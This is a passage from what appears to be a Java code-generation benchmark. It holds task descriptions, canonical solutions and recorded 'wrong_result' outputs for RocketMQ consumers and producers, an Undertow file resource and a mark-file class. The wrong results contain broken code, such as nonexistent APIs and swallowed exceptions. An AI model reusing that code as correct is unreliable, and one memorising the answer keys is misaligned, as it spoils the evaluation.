StandardOpenOption.CREATE,\n                    StandardOpenOption.WRITE,\n                    StandardOpenOption.TRUNCATE_EXISTING);\n            }\n            catch (final IOException ex)\n            {\n                throw new RuntimeException(\"failed to create link for mark file directory\", ex);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class MarkFile implements AutoCloseable {\n    private final File markFile;\n    private final MappedByteBuffer mappedBuffer;\n    private final UnsafeBuffer buffer;\n    private final AtomicBoolean isClosed;\n    private static final int VERSION_OFFSET = 0;\n    private static final int TIMESTAMP_OFFSET = 4;\n    private static final int PID_OFFSET = 12;\n    private static final int MAX_PID_LENGTH = 16;\n\n    public MarkFile(File markFile, boolean create, int version, int maxTtlSeconds, int pid, long initialTimestamp, EpochClock epochClock, IntConsumer versionValidator, Consumer<String> errorHandler) {\n        this.markFile = markFile;\n        this.isClosed = new AtomicBoolean(false);\n        this.mappedBuffer = mapNewOrExistingMarkFile(markFile, create, version, maxTtlSeconds, pid, initialTimestamp, epochClock, versionValidator, errorHandler);\n        this.buffer = new UnsafeBuffer(mappedBuffer);\n    }\n\n    @Override\n    public void close() {\n        if (isClosed.compareAndSet(false, true)) {\n            try {\n                mappedBuffer.clear();\n                ((FileChannel) mappedBuffer.channel()).close();\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n    }\n\n    private static MappedByteBuffer mapNewOrExistingMarkFile(File markFile, boolean create, int version, int maxTtlSeconds, int pid, long initialTimestamp, EpochClock epochClock, IntConsumer versionValidator, Consumer<String> errorHandler) throws IOException {\n        if (!markFile.exists() && !create) {\n            throw new IOException(\"Mark file does not exist and create flag is false\");\n        }\n\n        FileChannel channel = FileChannel.open(markFile.toPath(), StandardOpenOption.READ, StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n        MappedByteBuffer buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, 12 + MAX_PID_LENGTH);\n\n        if (create) {\n            buffer.putInt(VERSION_OFFSET, version);\n            buffer.putLong(TIMESTAMP_OFFSET, initialTimestamp);\n            buffer.putInt(PID_OFFSET, pid);\n            buffer.position(12 + MAX_PID_LENGTH);\n        } else {\n            int existingVersion = buffer.getInt(VERSION_OFFSET);\n            versionValidator.accept(existingVersion);\n            long timestamp = buffer.getLong(TIMESTAMP_OFFSET);\n            if (epochClock.now() - timestamp > maxTtlSeconds * 1000) {\n                errorHandler.accept(\"Mark file timestamp is too old\");\n            }\n        }\n\n        return buffer;\n    }\n\n    private static void ensureMarkFileLink(File markFile, File targetDir, String linkName) {\n        try {\n            Files.createSymbolicLink(targetDir.toPath().resolve(linkName), markFile.toPath());\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n}"
  },
  {
    "Task_id": 373,
    "Instruction": "Task Description: Create a Java class that configures and initializes a RocketMQ push consumer with specific settings for message consumption, including topic subscription and message listener registration.\n\nClass Description: The `AliyunMqConfiguration` class is a Spring configuration class that sets up a RocketMQ push consumer (`DefaultMQPushConsumer`). It configures the consumer with NameServer address, consumption strategy, topic subscriptions with tags, and registers a message listener. The consumer is started asynchronously after a delay.\n\nAttributes:\n- `paascloudProperties`: [PaascloudProperties] - Contains configuration properties for the RocketMQ consumer, including NameServer address and consumer group.\n- `optPushConsumer`: [OptPushMessageListener] - The message listener implementation that handles incoming messages.\n- `taskExecutor`: [TaskExecutor] - Executor service used to start the consumer asynchronously.\n\nMethods:\n- `defaultMQPushConsumer()`: [None] -> [DefaultMQPushConsumer] - Configures and initializes the RocketMQ push consumer. Sets the NameServer address, consumption strategy, subscribes to topics with tags, registers the message listener, and starts the consumer asynchronously after a delay. Throws `MQClientException` if there's an error in consumer configuration.\n\nThe class follows Spring's dependency injection pattern and uses `@Bean` to expose the consumer instance to the Spring context. The consumer is started in a separate thread to avoid blocking the main application startup.",
    "Canonical_solution": "import com.paascloud.PublicUtil;\nimport com.paascloud.base.constant.AliyunMqTopicConstants;\nimport com.paascloud.base.constant.GlobalConstant;\nimport com.paascloud.config.properties.PaascloudProperties;\nimport com.paascloud.provider.consumer.listener.OptPushMessageListener;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.core.task.TaskExecutor;\n\nimport javax.annotation.Resource;\n\n@Configuration\npublic class AliyunMqConfiguration {\n\n    @Resource\n    private PaascloudProperties paascloudProperties;\n\n    @Resource\n    private OptPushMessageListener optPushConsumer;\n\n    @Resource\n    private TaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getAliyun().getRocketMq().getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getAliyun().getRocketMq().getNamesrvAddr());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n\n        String[] strArray = AliyunMqTopicConstants.ConsumerTopics.OPT.split(GlobalConstant.Symbol.COMMA);\n        for (String aStrArray : strArray) {\n            String[] topicArray = aStrArray.split(GlobalConstant.Symbol.AT);\n            String topic = topicArray[0];\n            String tags = topicArray[1];\n            if (PublicUtil.isEmpty(tags)) {\n                tags = \"*\";\n            }\n            consumer.subscribe(topic, tags);\n        }\n\n        consumer.registerMessageListener(optPushConsumer);\n        consumer.setConsumeThreadMax(2);\n        consumer.setConsumeThreadMin(2);\n\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (InterruptedException | MQClientException e) {\n                e.printStackTrace();\n            }\n        });\n        return consumer;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "```java\n@Configuration\npublic class AliyunMqConfiguration {\n\n    @Autowired\n    private PaascloudProperties paascloudProperties;\n\n    @Autowired\n    private OptPushMessageListener optPushConsumer;\n\n    @Autowired\n    private TaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getRocketmq().getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getRocketmq().getNameServerAddress());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        consumer.subscribe(paascloudProperties.getRocketmq().getTopic(), \"*\");\n        consumer.registerMessageListener(optPushConsumer);\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (InterruptedException | MQClientException e) {\n                throw new RuntimeException(\"Failed to start RocketMQ consumer\", e);\n            }\n        });\n        return consumer;\n    }\n}\n```"
  },
  {
    "Task_id": 378,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to subscribe to messages from a specified topic and handle them asynchronously.\n\nClass Description: The RocketMQConsumer class is a message consumer implementation that uses RocketMQ's push-based consumption model. It subscribes to a specified topic, configures consumption settings, and processes incoming messages through a registered message listener.\n\nAttributes:\n- log: Logger - SLF4J logger instance for logging consumer activities\n- defaultMQPushConsumer: DefaultMQPushConsumer - The core RocketMQ push consumer instance\n- rpcHook: RPCHook - Optional RPC hook for custom communication handling\n- topicName: String - The topic name to subscribe to\n- consumerGroup: String - The consumer group name for this consumer\n\nMethods:\n- RocketMQConsumer(RPCHook, String, String) -> void - Constructor that initializes the consumer with RPC hook, topic name, and consumer group\n- startConsumer() -> void - Configures and starts the consumer instance, subscribes to the topic, and registers the message listener\n- shutdown() -> void - Gracefully shuts down the consumer instance\n- buildSendMessageRequestHeader(Message, String, int) -> SendMessageRequestHeader - Helper method to build message request headers for sending messages\n- (implements) consumeMessage(List<MessageExt>, ConsumeConcurrentlyContext) -> ConsumeConcurrentlyStatus - Message listener implementation that processes consumed messages (inherited from MessageListenerConcurrently interface)",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport java.nio.charset.StandardCharsets;\nimport java.time.Duration;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageDecoder;\nimport org.apache.rocketmq.common.topic.TopicValidator;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\nimport org.apache.rocketmq.proxy.common.ProxyContext;\nimport org.apache.rocketmq.proxy.common.ProxyException;\nimport org.apache.rocketmq.proxy.common.ProxyExceptionCode;\nimport org.apache.rocketmq.remoting.RPCHook;\nimport org.apache.rocketmq.remoting.protocol.header.SendMessageRequestHeader;\nimport org.apache.rocketmq.remoting.protocol.heartbeat.MessageModel;\n\npublic class RocketMQConsumer implements MessageListenerConcurrently {\n    private static final Logger log = LoggerFactory.getLogger(LoggerName.PROXY_LOGGER_NAME);\n    private DefaultMQPushConsumer defaultMQPushConsumer;\n    private RPCHook rpcHook;\n    private String topicName;\n    private String consumerGroup;\n\n    public RocketMQConsumer(RPCHook rpcHook, String topicName, String consumerGroup) {\n        this.rpcHook = rpcHook;\n        this.topicName = topicName;\n        this.consumerGroup = consumerGroup;\n    }\n\n    public void startConsumer() throws Exception {\n        this.defaultMQPushConsumer = new DefaultMQPushConsumer(this.consumerGroup, this.rpcHook);\n        this.defaultMQPushConsumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        this.defaultMQPushConsumer.setMessageModel(MessageModel.BROADCASTING);\n        \n        try {\n            this.defaultMQPushConsumer.subscribe(this.topicName, \"*\");\n        } catch (MQClientException e) {\n            throw new ProxyException(ProxyExceptionCode.INTERNAL_SERVER_ERROR, \n                \"subscribe to topic \" + this.topicName + \" failed. \" + e.getMessage());\n        }\n        \n        this.defaultMQPushConsumer.registerMessageListener(this);\n        this.defaultMQPushConsumer.start();\n    }\n\n    public void shutdown() throws Exception {\n        if (this.defaultMQPushConsumer != null) {\n            this.defaultMQPushConsumer.shutdown();\n        }\n    }\n\n    protected SendMessageRequestHeader buildSendMessageRequestHeader(Message message,\n        String producerGroup, int queueId) {\n        SendMessageRequestHeader requestHeader = new SendMessageRequestHeader();\n        requestHeader.setProducerGroup(producerGroup);\n        requestHeader.setTopic(message.getTopic());\n        requestHeader.setDefaultTopic(TopicValidator.AUTO_CREATE_TOPIC_KEY_TOPIC);\n        requestHeader.setDefaultTopicQueueNums(0);\n        requestHeader.setQueueId(queueId);\n        requestHeader.setSysFlag(0);\n        requestHeader.setBornTimestamp(System.currentTimeMillis());\n        requestHeader.setFlag(message.getFlag());\n        requestHeader.setProperties(MessageDecoder.messageProperties2String(message.getProperties()));\n        requestHeader.setReconsumeTimes(0);\n        requestHeader.setBatch(false);\n        return requestHeader;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.List;\n\npublic class RocketMQConsumer {\n    private static final Logger log = LoggerFactory.getLogger(RocketMQConsumer.class);\n    private DefaultMQPushConsumer defaultMQPushConsumer;\n    private RPCHook rpcHook;\n    private String topicName;\n    private String consumerGroup;\n\n    public RocketMQConsumer(RPCHook rpcHook, String topicName, String consumerGroup) {\n        this.rpcHook = rpcHook;\n        this.topicName = topicName;\n        this.consumerGroup = consumerGroup;\n        this.defaultMQPushConsumer = new DefaultMQPushConsumer(consumerGroup);\n        if (rpcHook != null) {\n            this.defaultMQPushConsumer.setRPCHook(rpcHook);\n        }\n    }\n\n    public void startConsumer() {\n        try {\n            defaultMQPushConsumer.subscribe(topicName, \"*\");\n            defaultMQPushConsumer.setConsumeMessageBatchMaxSize(10);\n            defaultMQPushConsumer.registerMessageListener((MessageListenerConcurrently) this::consumeMessage);\n            defaultMQPushConsumer.start();\n            log.info(\"RocketMQ consumer started successfully for topic: {}\", topicName);\n        } catch (Exception e) {\n            log.error(\"Failed to start RocketMQ consumer for topic: {}\", topicName, e);\n        }\n    }\n\n    public void shutdown() {\n        if (defaultMQPushConsumer != null) {\n            defaultMQPushConsumer.shutdown();\n            log.info(\"RocketMQ consumer shut down gracefully for topic: {}\", topicName);\n        }\n    }\n\n    public SendMessageRequestHeader buildSendMessageRequestHeader(Message message, String brokerName, int queueId) {\n        return new SendMessageRequestHeader(message.getTopic(), brokerName, queueId, message.getBody().length, message.getProperties());\n    }\n\n    public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> messages, ConsumeConcurrentlyContext context) {\n        try {\n            for (MessageExt message : messages) {\n                log.info(\"Received message: {} from topic: {}\", new String(message.getBody()), message.getTopic());\n                // Process the message here\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        } catch (Exception e) {\n            log.error(\"Failed to consume messages\", e);\n            return ConsumeConcurrentlyStatus.RECONSUME_LATER;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 38,
    "Instruction": "Task Description: Implement a resource handler class that serves file content from a specified path, supporting both full file serving and range requests, using Java NIO's FileChannel for efficient file operations.\n\nClass Description: PathResource is a file resource handler that serves content from a file system path, supporting standard and ranged requests. It utilizes FileChannel for efficient reading and implements resource management through a PathResourceManager.\n\nAttributes:\n- file: Path - The file path to serve content from\n- manager: PathResourceManager - Manages resource access and transfer size thresholds\n\nMethods:\n- serve(Sender, HttpServerExchange, IoCallback) -> void - Serves the entire file content to the client\n- serveRange(Sender, HttpServerExchange, long, long, IoCallback) -> void - Serves a specific byte range of the file content\n- getContentLength() -> Long - Returns the size of the file in bytes or null if unavailable\n- serveImpl(Sender, HttpServerExchange, long, long, IoCallback, boolean) -> void - Internal implementation handling both full and ranged requests\n\nThe class uses nested BaseFileTask, ServerTask, and TransferTask classes to handle different serving strategies:\n- ServerTask: Reads file content in chunks using pooled buffers\n- TransferTask: Uses zero-copy transfer for efficient large file serving\n\nThe implementation demonstrates proper FileChannel usage including:\n1. Opening channels with StandardOpenOption.READ\n2. Position manipulation for range requests\n3. Proper resource cleanup with safeClose\n4. Buffer management with PooledByteBuffer\n5. Error handling for file operations",
    "Canonical_solution": "import io.undertow.io.IoCallback;\nimport io.undertow.io.Sender;\nimport io.undertow.server.HttpServerExchange;\nimport io.undertow.connector.PooledByteBuffer;\nimport org.xnio.IoUtils;\n\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.NoSuchFileException;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class PathResource implements RangeAwareResource {\n\n    private final Path file;\n    private final PathResourceManager manager;\n\n    public PathResource(final Path file, final PathResourceManager manager, String path) {\n        this.file = file;\n        this.manager = manager;\n    }\n\n    @Override\n    public void serve(final Sender sender, final HttpServerExchange exchange, final IoCallback callback) {\n        serveImpl(sender, exchange, -1, -1, callback, false);\n    }\n\n    @Override\n    public void serveRange(final Sender sender, final HttpServerExchange exchange, final long start, final long end, final IoCallback callback) {\n        serveImpl(sender, exchange, start, end, callback, true);\n    }\n\n    private void serveImpl(final Sender sender, final HttpServerExchange exchange, final long start, final long end, final IoCallback callback, final boolean range) {\n        abstract class BaseFileTask implements Runnable {\n            protected volatile FileChannel fileChannel;\n\n            protected boolean openFile() {\n                try {\n                    fileChannel = FileChannel.open(file, StandardOpenOption.READ);\n                    if(range) {\n                        fileChannel.position(start);\n                    }\n                } catch (NoSuchFileException e) {\n                    exchange.setStatusCode(StatusCodes.NOT_FOUND);\n                    callback.onException(exchange, sender, e);\n                    return false;\n                } catch (IOException e) {\n                    exchange.setStatusCode(StatusCodes.INTERNAL_SERVER_ERROR);\n                    callback.onException(exchange, sender, e);\n                    return false;\n                }\n                return true;\n            }\n        }\n\n        class ServerTask extends BaseFileTask implements IoCallback {\n            private PooledByteBuffer pooled;\n            long remaining = end - start + 1;\n\n            @Override\n            public void run() {\n                if(range && remaining == 0) {\n                    if (pooled != null) {\n                        pooled.close();\n                        pooled = null;\n                    }\n                    IoUtils.safeClose(fileChannel);\n                    callback.onComplete(exchange, sender);\n                    return;\n                }\n                if (fileChannel == null) {\n                    if (!openFile()) {\n                        return;\n                    }\n                    pooled = exchange.getConnection().getByteBufferPool().allocate();\n                }\n                if (pooled != null) {\n                    ByteBuffer buffer = pooled.getBuffer();\n                    try {\n                        buffer.clear();\n                        int res = fileChannel.read(buffer);\n                        if (res == -1) {\n                            pooled.close();\n                            IoUtils.safeClose(fileChannel);\n                            callback.onComplete(exchange, sender);\n                            return;\n                        }\n                        buffer.flip();\n                        if(range) {\n                            if(buffer.remaining() > remaining) {\n                                buffer.limit((int) (buffer.position() + remaining));\n                            }\n                            remaining -= buffer.remaining();\n                        }\n                        sender.send(buffer, this);\n                    } catch (IOException e) {\n                        onException(exchange, sender, e);\n                    }\n                }\n            }\n\n            @Override\n            public void onComplete(final HttpServerExchange exchange, final Sender sender) {\n                if (exchange.isInIoThread()) {\n                    exchange.dispatch(this);\n                } else {\n                    run();\n                }\n            }\n\n            @Override\n            public void onException(final HttpServerExchange exchange, final Sender sender, final IOException exception) {\n                if (pooled != null) {\n                    pooled.close();\n                    pooled = null;\n                }\n                IoUtils.safeClose(fileChannel);\n                if (!exchange.isResponseStarted()) {\n                    exchange.setStatusCode(StatusCodes.INTERNAL_SERVER_ERROR);\n                }\n                callback.onException(exchange, sender, exception);\n            }\n        }\n\n        class TransferTask extends BaseFileTask {\n            @Override\n            public void run() {\n                if (!openFile()) {\n                    return;\n                }\n                sender.transferFrom(fileChannel, new IoCallback() {\n                    @Override\n                    public void onComplete(HttpServerExchange exchange, Sender sender) {\n                        try {\n                            IoUtils.safeClose(fileChannel);\n                        } finally {\n                            callback.onComplete(exchange, sender);\n                        }\n                    }\n\n                    @Override\n                    public void onException(HttpServerExchange exchange, Sender sender, IOException exception) {\n                        try {\n                            IoUtils.safeClose(fileChannel);\n                        } finally {\n                            callback.onException(exchange, sender, exception);\n                        }\n                    }\n                });\n            }\n        }\n\n        BaseFileTask task;\n        try {\n            task = manager.getTransferMinSize() > Files.size(file) || range ? new ServerTask() : new TransferTask();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n        if (exchange.isInIoThread()) {\n            exchange.dispatch(task);\n        } else {\n            task.run();\n        }\n    }\n\n    @Override\n    public Long getContentLength() {\n        try {\n            if (Files.isSymbolicLink(file) && Files.notExists(file)) {\n                return null;\n            }\n            return Files.size(file);\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class PathResource {\n    private final Path file;\n    private final PathResourceManager manager;\n\n    public PathResource(Path file, PathResourceManager manager) {\n        this.file = file;\n        this.manager = manager;\n    }\n\n    public void serve(Sender sender, HttpServerExchange exchange, IoCallback callback) {\n        serveImpl(sender, exchange, 0, -1, callback, false);\n    }\n\n    public void serveRange(Sender sender, HttpServerExchange exchange, long start, long end, IoCallback callback) {\n        serveImpl(sender, exchange, start, end, callback, true);\n    }\n\n    public Long getContentLength() {\n        try {\n            return Files.size(file);\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    private void serveImpl(Sender sender, HttpServerExchange exchange, long start, long end, IoCallback callback, boolean isRange) {\n        if (!Files.exists(file)) {\n            exchange.setStatusCode(404);\n            callback.done();\n            return;\n        }\n\n        try (FileChannel channel = FileChannel.open(file, StandardOpenOption.READ)) {\n            long contentLength = channel.size();\n            if (start < 0 || start >= contentLength) {\n                exchange.setStatusCode(416);\n                callback.done();\n                return;\n            }\n\n            if (end < 0 || end >= contentLength) {\n                end = contentLength - 1;\n            }\n\n            if (start > end) {\n                exchange.setStatusCode(416);\n                callback.done();\n                return;\n            }\n\n            long rangeLength = end - start + 1;\n            exchange.getResponseHeaders().put(Headers.CONTENT_LENGTH, String.valueOf(rangeLength));\n            exchange.getResponseHeaders().put(Headers.CONTENT_RANGE, \"bytes \" + start + \"-\" + end + \"/\" + contentLength);\n\n            if (isRange) {\n                exchange.setStatusCode(206);\n            } else {\n                exchange.setStatusCode(200);\n            }\n\n            if (manager.isTransferEnabled()) {\n                TransferTask task = new TransferTask(channel, start, rangeLength, sender, exchange, callback);\n                task.run();\n            } else {\n                ServerTask task = new ServerTask(channel, start, rangeLength, sender, exchange, callback);\n                task.run();\n            }\n        } catch (IOException e) {\n            exchange.setStatusCode(500);\n            callback.done();\n        }\n    }\n\n    private static class BaseFileTask {\n        protected final FileChannel channel;\n        protected final long start;\n        protected final long length;\n        protected final Sender sender;\n        protected final HttpServerExchange exchange;\n        protected final IoCallback callback;\n\n        protected BaseFileTask(FileChannel channel, long start, long length, Sender sender, HttpServerExchange exchange, IoCallback callback) {\n            this.channel = channel;\n            this.start = start;\n            this.length = length;\n            this.sender = sender;\n            this.exchange = exchange;\n            this.callback = callback;\n        }\n\n        protected void safeClose() {\n            try {\n                channel.close();\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n    }\n\n    private static class ServerTask extends BaseFileTask {\n        protected ServerTask(FileChannel channel, long start, long length, Sender sender, HttpServerExchange exchange, IoCallback callback) {\n            super(channel, start, length, sender, exchange, callback);\n        }\n\n        protected void run() {\n            ByteBuffer buffer = PooledByteBuffer.allocate(8192);\n            try {\n                channel.position(start);\n                long remaining = length;\n                while (remaining > 0) {\n                    int read = channel.read(buffer, channel.position());\n                    if (read == -1) break;\n                    buffer.flip();\n                    sender.send(buffer, callback);\n                    buffer.clear();\n                    remaining -= read;\n                }\n            } catch (IOException e) {\n                exchange.setStatusCode(500);\n                callback.done();\n            } finally {\n                safeClose();\n            }\n        }\n    }\n\n    private static class TransferTask extends BaseFileTask {\n        protected TransferTask(FileChannel channel, long start, long length, Sender sender, HttpServerExchange exchange, IoCallback callback) {\n            super(channel, start, length, sender, exchange, callback);\n        }\n\n        protected void run() {\n            try {\n                sender.transferFrom(channel, start, length, callback);\n            } catch (IOException e) {\n                exchange.setStatusCode(500);\n                callback.done();\n            } finally {\n                safeClose();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 380,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to asynchronously receive and process messages from a specified topic, measuring the delay between message delivery and consumption.\n\nClass Description: The TimerConsumer class is a RocketMQ push consumer that subscribes to a specified topic, processes incoming messages, and calculates the time delay between when messages were delivered and when they were consumed. It provides command-line configuration for NameServer address and topic name.\n\nAttributes:\n- topic: String - The RocketMQ topic to subscribe to for messages\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- TimerConsumer(String[] args) - Constructor - Initializes the consumer with command-line arguments for NameServer address and topic\n  Input: args: String[] - Command-line arguments containing optional NameServer address and topic\n  Output: None\n\n- start() - void - Starts the consumer, subscribes to the topic, and registers a message listener\n  Input: None\n  Output: None (throws MQClientException if startup fails)\n\n- buildCommandlineOptions(Options options) - Options - Helper method to define command-line options\n  Input: options: Options - Apache Commons CLI Options object to extend\n  Output: Options - The extended Options object with consumer-specific options",
    "Canonical_solution": "import org.apache.commons.cli.CommandLine;\nimport org.apache.commons.cli.DefaultParser;\nimport org.apache.commons.cli.Option;\nimport org.apache.commons.cli.Options;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.ThreadFactoryImpl;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.srvutil.ServerUtil;\n\nimport java.util.List;\nimport java.util.concurrent.ScheduledExecutorService;\nimport java.util.concurrent.ScheduledThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class TimerConsumer {\n    private final String topic;\n    private final DefaultMQPushConsumer consumer;\n\n    public TimerConsumer(String[] args) {\n        Options options = ServerUtil.buildCommandlineOptions(new Options());\n        final CommandLine commandLine = ServerUtil.parseCmdLine(\"benchmarkTimerConsumer\", args, buildCommandlineOptions(options), new DefaultParser());\n        if (null == commandLine) {\n            System.exit(-1);\n        }\n\n        final String namesrvAddr = commandLine.hasOption('n') ? commandLine.getOptionValue('t').trim() : \"localhost:9876\";\n        topic = commandLine.hasOption('t') ? commandLine.getOptionValue('t').trim() : \"BenchmarkTest\";\n        System.out.printf(\"namesrvAddr: %s, topic: %s%n\", namesrvAddr, topic);\n\n        consumer = new DefaultMQPushConsumer(\"benchmark_consumer\");\n        consumer.setInstanceName(Long.toString(System.currentTimeMillis()));\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        consumer.subscribe(topic, \"*\");\n\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                MessageExt msg = msgs.get(0);\n                long now = System.currentTimeMillis();\n\n                long deliverTimeMs = Long.parseLong(msg.getProperty(\"MY_RECORD_TIMER_DELIVER_MS\"));\n                long delayedDuration = now - deliverTimeMs;\n\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n\n        consumer.start();\n        System.out.printf(\"Start receiving messages%n\");\n    }\n\n    private Options buildCommandlineOptions(Options options) {\n        Option opt = new Option(\"n\", \"namesrvAddr\", true, \"Nameserver address, default: localhost:9876\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        opt = new Option(\"t\", \"topic\", true, \"Send messages to which topic, default: BenchmarkTest\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        return options;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class TimerConsumer {\n    private String topic;\n    private DefaultMQPushConsumer consumer;\n\n    public TimerConsumer(String[] args) throws Exception {\n        Options options = new Options();\n        buildCommandlineOptions(options);\n        CommandLineParser parser = new DefaultParser();\n        CommandLine cmd = parser.parse(options, args);\n\n        String namesrvAddr = cmd.getOptionValue(\"n\", \"localhost:9876\");\n        topic = cmd.getOptionValue(\"t\", \"test\");\n\n        consumer = new DefaultMQPushConsumer(\"TimerConsumerGroup\");\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        consumer.subscribe(topic, \"*\");\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (MessageExt msg : msgs) {\n                long delay = System.currentTimeMillis() - msg.getBornTimestamp();\n                System.out.println(\"Received message: \" + new String(msg.getBody()) + \", Delay: \" + delay + \"ms\");\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n        consumer.start();\n    }\n\n    private Options buildCommandlineOptions(Options options) {\n        options.addOption(\"n\", \"namesrv\", true, \"NameServer address\");\n        options.addOption(\"t\", \"topic\", true, \"Topic name\");\n        return options;\n    }\n}"
  },
  {
    "Task_id": 385,
    "Instruction": "Task Description: Create a Java class that implements a simple RocketMQ producer to send messages to a specified topic.\n\nClass Description: The SimpleProducer class provides basic functionality to send messages to a RocketMQ broker. It handles producer initialization, message sending, and cleanup.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance that handles message sending operations\n\nMethods:\n- SimpleProducer(String producerGroup, String namesrvAddr) -> Constructor - Initializes the producer with the specified producer group and NameServer address\n- start() -> void - Starts the producer instance to begin sending messages\n- sendMessage(String topic, String tags, String keys, byte[] body) -> void - Creates and sends a message with the specified topic, tags, keys, and body content\n- shutdown() -> void - Shuts down the producer instance and releases resources",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\n\npublic class SimpleProducer {\n    private DefaultMQProducer producer;\n\n    public SimpleProducer(String producerGroup, String namesrvAddr) {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public void sendMessage(String topic, String tags, String keys, byte[] body) throws Exception {\n        Message msg = new Message(topic, tags, keys, body);\n        producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "wrong_result": "public class SimpleProducer {\n    private DefaultMQProducer producer;\n\n    public SimpleProducer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() {\n        try {\n            this.producer.start();\n        } catch (MQClientException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String topic, String tags, String keys, byte[] body) {\n        try {\n            Message msg = new Message(topic, tags, keys, body);\n            SendResult sendResult = this.producer.send(msg);\n            System.out.println(\"Message sent: \" + sendResult.getMsgId());\n        } catch (MQClientException | InterruptedException | RemotingException | MQBrokerException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        this.producer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 386,
